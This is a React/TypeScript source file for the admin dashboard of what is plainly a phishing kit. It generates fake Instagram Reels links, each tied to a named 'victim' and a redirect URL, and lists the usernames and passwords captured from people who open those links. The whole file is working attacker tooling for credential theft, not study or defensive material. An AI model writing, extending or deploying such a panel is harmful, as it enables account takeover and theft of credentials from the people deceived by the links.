import { useState, useEffect, useCallback } from 'react';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Label } from '@/components/ui/label';
import { toast } from 'sonner';
import { supabase } from '@/lib/supabase';
import { useAuth } from '@/context/AuthContext';
import { Copy, Loader2, RefreshCw, Link2, Users } from 'lucide-react';

const generateReelId = () => {
  return Math.random().toString(36).substring(2, 8);
};

interface Submission {
  id: string;
  reelId: string;
  username: string;
  password: string;
  created_at: string;
  reels: {
    victim_name: string | null;
  } | null;
}

export default function CreateReelPage() {
  const [loading, setLoading] = useState(true);
  const [newReelId, setNewReelId] = useState(generateReelId());
  const [redirectUrl, setRedirectUrl] = useState('');
  const [victimName, setVictimName] = useState('');
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [lastCreatedLink, setLastCreatedLink] = useState<string | null>(null);
  const { user } = useAuth();

  const fetchSubmissions = useCallback(async () => {
    if (!user) return;
    setLoading(true);
    try {
      const { data: reelsData, error: reelsError } = await supabase
        .from('reels')
        .select('reelId')
        .eq('userId', user.id);

      if (reelsError) throw reelsError;

      const reelIds = reelsData.map((reel) => reel.reelId);

      if (reelIds.length === 0) {
        setSubmissions([]);
        return;
      }

      const { data, error } = await supabase
        .from('submissions')
        .select('id, username, password, reels(victim_name)')
        .in('reelId', reelIds);

      if (error) throw error;
      // setSubmissions(data || []);
      setSubmissions(
        (data || []).map((item: any) => ({
          ...item,
          reels: Array.isArray(item.reels) ? item.reels[0] || null : item.reels ?? null,
        }))
      );
    } catch (error: any) {
      console.error('Error fetching submissions:', error);
      toast.error(error.message || 'Failed to fetch submissions.');
    } finally {
      setLoading(false);
    }
  }, [user]);

  useEffect(() => {
    fetchSubmissions();
  }, [fetchSubmissions]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setLastCreatedLink(null);

    if (!user) {
      toast.error('You must be logged in to create a ReelID.');
      setIsSubmitting(false);
      return;
    }

    if (!redirectUrl) {
      toast.error('Please provide a redirect URL.');
      setIsSubmitting(false);
      return;
    }

    try {
      const reelIdToSubmit = newReelId;
      const { error } = await supabase.from('reels').insert([
        {
          reelId: reelIdToSubmit,
          redirectUrl: redirectUrl,
          userId: user.id,
          victim_name: victimName || null,
        },
      ]);

      if (error) throw error;

      toast.success('Reel link created successfully!');
      const link = `https://instagram-reels-dun.vercel.app/${reelIdToSubmit}`;
      setLastCreatedLink(link);
      setRedirectUrl('');
      setNewReelId(generateReelId());
      fetchSubmissions();
    } catch (error: any) {
      toast.error(error.message || 'Failed to create ReelID.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="grid gap-8 lg:grid-cols-3">
      <div className="lg:col-span-1 space-y-6">
        <Card className="bg-gray-800 border-gray-700 shadow-lg rounded-lg">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-xl font-semibold text-gray-100">
              <Link2 className="h-5 w-5" /> Create New Link
            </CardTitle>
            <CardDescription className="text-gray-400">Generate a unique link to share.</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="newReelId" className="font-medium text-gray-300">New ReelID</Label>
                <div className="flex items-center gap-2">
                  <Input id="newReelId" type="text" value={newReelId} readOnly className="font-mono bg-gray-700 border-gray-600 text-gray-200" />
                  <Button type="button" variant="outline" size="icon" onClick={() => setNewReelId(generateReelId())} className="border-gray-600 bg-gray-700 hover:bg-gray-600">
                    <RefreshCw className="h-4 w-4" />
                  </Button>
                </div>
              </div>
              <div className="space-y-2">
                <Label htmlFor="victimName" className="font-medium text-gray-300">Victim Name <span className='text-gray-400'>(Optional)</span></Label>
                <Input
                  id="victimName"
                  type="text"
                  placeholder="e.g., John Doe"
                  value={victimName}
                  onChange={(e) => setVictimName(e.target.value)}
                  className="border-gray-600 bg-gray-700 text-gray-200"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="redirectUrl" className="font-medium text-gray-300">Redirect URL</Label>
                <Input
                  id="redirectUrl"
                  type="url"
                  placeholder="https://example.com"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                  required
                  className="border-gray-600 bg-gray-700 text-gray-200"
                />
              </div>
              <Button type="submit" className="w-full bg-white hover:bg-gray-200 text-black" disabled={isSubmitting}>
                {isSubmitting ? <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Creating...</> : 'Create Link'}
              </Button>
            </form>
          </CardContent>
        </Card>

        {lastCreatedLink && (
          <Card className="bg-gray-800 border-gray-700 shadow-lg rounded-lg">
            <CardHeader>
              <CardTitle className="text-lg font-semibold text-gray-100">Link Created!</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-sm text-gray-400 mb-3">Share this link:</p>
              <div className="flex items-center gap-2">
                <Input type="text" value={lastCreatedLink} readOnly className="font-mono bg-gray-700 text-sm border-gray-600 text-gray-200" />
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => {
                    navigator.clipboard.writeText(lastCreatedLink);
                    toast.success('Link copied!');
                  }}
                  className="border-gray-600 bg-gray-700 hover:bg-gray-600"
                >
                  <Copy className="h-4 w-4" />
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
      </div>

      <div className="lg:col-span-2">
        <Card className="bg-gray-800 border-gray-700 shadow-lg rounded-lg">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-xl font-semibold text-gray-100">
              <Users className="h-5 w-5" /> Recent Submissions
            </CardTitle>
            <CardDescription className="text-gray-400">Here are the latest submissions from your links.</CardDescription>
          </CardHeader>
          <CardContent>
            {loading ? (
              <div className="flex justify-center items-center h-48">
                <Loader2 className="h-8 w-8 text-gray-500 animate-spin" />
              </div>
            ) : submissions.length > 0 ? (
              <div className="space-y-3 max-h-[60vh] overflow-y-auto pr-2">
                {submissions.map((submission) => (
                  <div key={submission.id} className="flex items-center gap-4 p-3 bg-gray-700/50 rounded-md border border-gray-700">
                    <div className="flex-1 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 overflow-hidden gap-4">
                      <p className="text-sm text-gray-100 font-medium">Victim: {submission.reels?.victim_name || 'Anonymous'}</p>
                      <p className="text-sm text-gray-400">UN: {submission.username}</p>
                      <p className="text-sm text-gray-400">PW: {submission.password}</p>
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <p className="text-center text-gray-400 py-16">No submissions yet.</p>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
